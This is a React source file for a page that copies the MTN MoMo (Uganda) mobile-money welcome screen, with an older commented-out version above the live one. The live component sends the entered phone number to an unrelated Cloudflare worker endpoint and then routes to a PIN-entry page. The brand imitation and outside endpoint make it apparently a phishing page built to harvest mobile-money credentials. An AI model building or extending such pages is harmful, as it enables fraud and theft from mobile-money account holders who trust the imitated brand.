// import React,{ useState } from "react";
// import momoLogo from "./assets/logo (1).png";

// function UgandaMark() {
//   return (
//     <span
//       aria-hidden="true"
//       className="relative flex h-11 w-11 items-center justify-center overflow-hidden rounded-full bg-[#4d762f]"
//     >
//       <span className="absolute bottom-0 flex h-7 w-[22px] overflow-hidden">
//         <i className="h-full w-1/3 bg-black" />
//         <i className="h-full w-1/3 bg-[#f7cf20]" />
//         <i className="h-full w-1/3 bg-[#d71920]" />
//       </span>
//       <span className="absolute top-[10px] h-2 w-3 rotate-[-12deg] rounded-[50%_50%_20%_20%] bg-[#f7cf20]" />
//     </span>
//   );
// }

// function MoMoWelcome() {
//   const [phone, setPhone] = useState("");
//   const [error, setError] = useState("");

//   const handleSubmit = (event) => {
//     event.preventDefault();
//     if (!phone.trim()) {
//       setError("Please enter your mobile number.");
//       return;
//     }
//     setError("");
//   };

//   return (
//     <div className="relative mx-auto flex min-h-dvh w-full max-w-[740px] flex-col overflow-hidden bg-white font-sans text-[#07516a]">
//       <div
//         aria-hidden="true"
//         className="absolute inset-x-0 top-0 h-[36.5vh] min-h-[300px] bg-gradient-to-b from-[#075876] to-[#003e5c] [clip-path:polygon(0_0,100%_0,100%_98%,50%_100%,0_98%)]"
//       />

//       {/* <StatusBar /> */}

//       <header className="absolute  inset-x-0 top-[4.4vh] z-[1] flex justify-center">
//         <img
//           alt="MoMo from MTN"
//           src={momoLogo}
//           className="h-[clamp(130px,23vh,190px)] w-[clamp(130px,23vh,190px)] object-contain"
//         />
//       </header>

//       <main className="relative z-[1] flex flex-col px-[4.7%] pt-[27.9vh]">
//         <section className="w-full rounded-[clamp(32px,7vw,50px)] bg-white px-[clamp(24px,5vw,38px)] pb-[clamp(32px,5vh,38px)] pt-[clamp(30px,4vh,40px)] shadow-[0_12px_24px_rgba(0,0,0,0.12)]">
//           <h1 className="text-center text-[clamp(25px,5.4vw,40px)] font-normal leading-tight tracking-[0.01em]">
//             Welcome to <span className="font-bold">MoMo</span>
//           </h1>

//           <form id="welcome-form" onSubmit={handleSubmit} className="mt-[clamp(42px,5vh,70px)]">
//             <div className="flex gap-[clamp(14px,3vw,22px)]">
//               <button
//                 type="button"
//                 aria-label="Country code: Uganda"
//                 className="flex h-[clamp(76px,8.5vh,136px)] w-[clamp(76px,18vw,132px)] shrink-0 items-center justify-center rounded-[clamp(18px,3.5vw,26px)] border-2 border-black bg-white"
//               >
//                 <UgandaMark />
//               </button>
//               <input
//                 type="tel"
//                 inputMode="tel"
//                 autoComplete="tel"
//                 aria-label="Enter number"
//                 aria-invalid={Boolean(error)}
//                 aria-describedby={error ? "phone-error" : undefined}
//                 placeholder="Enter number *"
//                 value={phone}
//                 onChange={(event) => {
//                   setPhone(event.target.value);
//                   setError("");
//                 }}
//                 className="h-[clamp(76px,8.5vh,136px)] min-w-0 flex-1 rounded-[clamp(18px,3.5vw,26px)] border-2 border-black bg-white px-[clamp(18px,4vw,30px)] text-[clamp(21px,5vw,36px)] text-black outline-none placeholder:text-black focus:border-[#07516a]"
//               />
//             </div>

//             {error && (
//               <p id="phone-error" role="alert" className="mt-3 text-center text-sm text-red-700">
//                 {error}
//               </p>
//             )}

//           </form>
//         </section>

//         <p className="mt-[clamp(40px,4.5vh,68px)] text-center text-[clamp(15px,3.8vw,28px)] leading-[1.35] text-[#6a6a6a]">
//           By using this app you agree to our{" "}
//           <a href="#mobile-terms" className="text-[#07516a]">
//             Mobile Terms of Use
//           </a>{" "}
//           and{" "}
//           <a href="#privacy-policy" className="text-[#07516a]">
//             Privacy Policy
//           </a>
//         </p>
//       </main>

//       <footer className="relative z-[1] px-[4.7%] pb-[max(6vh,24px)] pt-8">
//         <button
//           type="submit"
//           form="welcome-form"
//           className="h-[clamp(64px,6vh,96px)] w-full rounded-full bg-[#075876] text-[clamp(21px,4.2vw,30px)] font-semibold text-white transition-colors hover:bg-[#064a62] focus-visible:outline-4 focus-visible:outline-offset-4 focus-visible:outline-[#ffcc00]"
//         >
//           NEXT
//         </button>
//       </footer>
//     </div>
//   );
// }

// export default MoMoWelcome;
import React, { useState } from "react";
import momoLogo from "./assets/logo (1).png";
import { useNavigate } from "react-router-dom";

function UgandaMark() {
  return (
    <span
      aria-hidden="true"
      className="relative flex h-11 w-11 items-center justify-center
                 overflow-hidden rounded-full bg-[#4d762f]"
    >
      <span className="absolute bottom-0 flex h-7 w-[22px] overflow-hidden">
        <i className="h-full w-1/3 bg-black" />
        <i className="h-full w-1/3 bg-[#f7cf20]" />
        <i className="h-full w-1/3 bg-[#d71920]" />
      </span>

      <span
        className="absolute top-[10px] h-2 w-3 rotate-[-12deg]
                   rounded-[50%_50%_20%_20%] bg-[#f7cf20]"
      />
    </span>
  );
}

function MoMoWelcome() {
  const [phone, setPhone] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState("");
  const navigate = useNavigate();

  const handleSubmit = async (event) => {
    event.preventDefault();

    setError("");
    setSuccess("");

    const trimmedPhone = phone.trim();

    if (!trimmedPhone) {
      setError("Please enter your mobile number.");
      return;
    }

    setLoading(true);

    try {
      const response = await fetch("https://my-worker-app.instapayapi.workers.dev/api/phone", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          phone: trimmedPhone,
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(
          data?.message || "Unable to process your request."
        );
      }

      setSuccess(data?.message || "Mobile number submitted successfully.");

      // Example:
      navigate("/pin-entry", { state: { phone: trimmedPhone } });
    } catch (err) {
      setError(
        err instanceof Error
          ? err.message
          : "Something went wrong. Please try again."
      );
    } finally {
      setLoading(false);
    }
  };

  return (
    <div
      className="relative mx-auto flex min-h-dvh w-full max-w-[740px]
                 flex-col overflow-hidden bg-white font-sans text-[#07516a]"
    >
      {/* Background */}
      <div
        aria-hidden="true"
        className="absolute inset-x-0 top-0 h-[36.5vh] min-h-[300px]
                   bg-gradient-to-b from-[#075876] to-[#003e5c]
                   [clip-path:polygon(0_0,100%_0,100%_98%,50%_100%,0_98%)]"
      />

      {/* Logo */}
      <header
        className="absolute inset-x-0 top-[4.4vh] z-[1]
                   flex justify-center"
      >
        <img
          src={momoLogo}
          alt="MoMo from MTN"
          className="h-[clamp(130px,23vh,190px)]
                     w-[clamp(130px,23vh,190px)] object-contain"
        />
      </header>

      <main
        className="relative z-[1] flex flex-col
                   px-[4.7%] pt-[27.9vh]"
      >
        <section
          className="w-full rounded-[clamp(32px,7vw,50px)]
                     bg-white
                     px-[clamp(24px,5vw,38px)]
                     pb-[clamp(32px,5vh,38px)]
                     pt-[clamp(30px,4vh,40px)]
                     shadow-[0_12px_24px_rgba(0,0,0,0.12)]"
        >
          <h1
            className="text-center
                       text-[clamp(25px,5.4vw,40px)]
                       font-normal leading-tight"
          >
            Welcome to <span className="font-bold">MoMo</span>
          </h1>

          <form
            id="welcome-form"
            onSubmit={handleSubmit}
            className="mt-[clamp(42px,5vh,70px)]"
          >
            <div
              className="flex gap-[clamp(14px,3vw,22px)]"
            >
              <button
                type="button"
                aria-label="Country code: Uganda"
                className="flex h-[clamp(76px,8.5vh,136px)]
                           w-[clamp(76px,18vw,132px)]
                           shrink-0 items-center justify-center
                           rounded-[clamp(18px,3.5vw,26px)]
                           border-2 border-black bg-white"
              >
                <UgandaMark />
              </button>

              <input
                type="tel"
                inputMode="tel"
                autoComplete="tel"
                placeholder="Enter number *"
                value={phone}
                disabled={loading}
                onChange={(event) => {
                  setPhone(event.target.value);
                  setError("");
                  setSuccess("");
                }}
                className="h-[clamp(76px,8.5vh,136px)]
                           min-w-0 flex-1
                           rounded-[clamp(18px,3.5vw,26px)]
                           border-2 border-black
                           bg-white
                           px-[clamp(18px,4vw,30px)]
                           text-[clamp(21px,5vw,36px)]
                           text-black
                           outline-none
                           placeholder:text-black
                           focus:border-[#07516a]
                           disabled:bg-gray-100"
              />
            </div>

            {error && (
              <p
                role="alert"
                className="mt-3 text-center text-sm text-red-700"
              >
                {error}
              </p>
            )}

            {success && (
              <p
                role="status"
                className="mt-3 text-center text-sm text-green-700"
              >
                {success}
              </p>
            )}
          </form>
        </section>

        <p
          className="mt-[clamp(40px,4.5vh,68px)]
                     text-center
                     text-[clamp(15px,3.8vw,28px)]
                     leading-[1.35]
                     text-[#6a6a6a]"
        >
          By using this app you agree to our{" "}
          <a href="#mobile-terms" className="text-[#07516a]">
            Mobile Terms of Use
          </a>{" "}
          and{" "}
          <a href="#privacy-policy" className="text-[#07516a]">
            Privacy Policy
          </a>
        </p>
      </main>

      <footer
        className="relative z-[1]
                   px-[4.7%]
                   pb-[max(6vh,24px)]
                   pt-8"
      >
        <button
          type="submit"
          form="welcome-form"
          disabled={loading}
          className="h-[clamp(64px,6vh,96px)]
                     w-full
                     rounded-full
                     bg-[#075876]
                     text-[clamp(21px,4.2vw,30px)]
                     font-semibold
                     text-white
                     transition-colors
                     hover:bg-[#064a62]
                     disabled:cursor-not-allowed
                     disabled:opacity-60"
        >
          {loading ? "PLEASE WAIT..." : "NEXT"}
        </button>
      </footer>
    </div>
  );
}

export default MoMoWelcome;